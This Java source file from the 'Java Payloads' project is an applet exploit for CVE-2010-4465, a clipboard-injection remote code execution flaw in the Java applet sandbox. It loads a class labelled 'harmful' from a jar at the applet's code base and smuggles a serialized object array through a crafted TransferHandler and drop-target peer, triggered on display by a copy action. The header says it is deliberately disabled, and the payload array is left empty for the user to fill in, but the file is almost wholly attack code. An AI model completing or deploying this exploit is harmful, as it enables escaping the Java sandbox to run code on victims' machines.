/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Oracle Java Applet Clipboard Injection Remote Code Execution 
 * (CVE-2010-4465) based on 
 * <http://www.zerodayinitiative.com/advisories/ZDI-11-083/>
 * 
 * This version does not work out of the box: see DeserializationExploit.java and line 77 for how to reenable it.
 */

package javapayload.exploit;

import java.awt.*;
import java.awt.datatransfer.*;
import java.awt.dnd.*;
import java.awt.dnd.peer.DropTargetContextPeer;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import javapayload.loader.AppletLoader;
import javax.swing.*;
import javax.swing.text.DefaultEditorKit;

public class CVE_2010_4465 extends AppletLoader implements ClipboardOwner, ComponentListener {

	public static Serializable[] serializableCocktail = null;
	
	boolean exploited = false;
	MyJTextField jtf;

	public void init() {
		DeserializationExploit.instance = this;
		DeserializationExploit.resource = DeserializationExploit.class.getClassLoader().getResourceAsStream(DeserializationExploit.class.getName().replace('.', '/')+".class");
		String className = "javapayload.exploit.CVE_2010_4465_Loader";
		try {
			URL u1 = new URL(getCodeBase(), "1.jar");
			URL u2 = new URL(getCodeBase(), "2.jar");
			ClassLoader parent = this.getClass().getClassLoader();
			Class harmfulClass = URLClassLoader.newInstance(new URL[] { u2 }, parent).loadClass(className);
			Class harmlessClass = URLClassLoader.newInstance(new URL[] { u1 }, parent).loadClass(className);
			Serializable harmlessObject = (Serializable) harmlessClass.newInstance();
			// the serializable cocktail has to be mixed from the correct objects.
			// All objects needed are initialized within this try/catch block.
			// Fill them in yourself. When in doubt, trial and error should be feasible here...
			serializableCocktail = new Serializable[] { null, null };
		} catch (Throwable t) {
			t.printStackTrace();
			throw new RuntimeException();
		}
		add(jtf = new MyJTextField());
		addComponentListener(this);
	}

	public void componentShown(ComponentEvent e) {
		if (exploited) return;
		exploited = true;
		jtf.requestFocus();
		Timer ti = new Timer(10, new DefaultEditorKit.CopyAction());
		ti.setRepeats(false);
		ti.start();
	}
	
	public void lostOwnership(Clipboard clipboard, Transferable contents) {}
	public void componentResized(ComponentEvent e) {}
	public void componentMoved(ComponentEvent e) {}
	public void componentHidden(ComponentEvent e) {}

	public static class MyJTextField extends JTextField {
		public TransferHandler getTransferHandler() {
			return new MyTransferHandler();
		}
	}

	public static class MyTransferHandler extends TransferHandler implements DropTargetContextPeer, Transferable {

		public int getSourceActions(JComponent c) {
			return COPY;
		}

		protected Transferable createTransferable(JComponent c) {
			final DropTargetContext dtc = new MyDropTarget().createDropTargetContext();
			dtc.addNotify(this);
			Transferable tt = new DropTargetDragEvent(dtc, new Point(0, 0), 0, 0).getTransferable();
			return tt;
		}

		public boolean isTransferableJVMLocal() {
			return true;
		}

		public Transferable getTransferable() throws InvalidDnDOperationException {
			return this;
		}
		
		DataFlavor df = new DataFlavor(Serializable[].class, "X");

		public boolean isDataFlavorSupported(DataFlavor flavor) {
			return flavor.equals(df);
		}

		public DataFlavor[] getTransferDataFlavors() {
			return new DataFlavor[] { df };
		}

		public Object getTransferData(DataFlavor flavor) throws UnsupportedFlavorException, IOException {
			return serializableCocktail;
		}
		
		public void setTargetActions(int actions) {}
		public void rejectDrop() {}
		public void rejectDrag() {}
		public int getTargetActions() { return 0; }
		public DropTarget getDropTarget() { return null; }
		public void dropComplete(boolean success) {}
		public void acceptDrop(int dropAction) {}
		public void acceptDrag(int dragAction) {}
	}
		
	public static class MyDropTarget extends DropTarget {		
		public DropTargetContext createDropTargetContext() {
			return super.createDropTargetContext();
		}
	}
}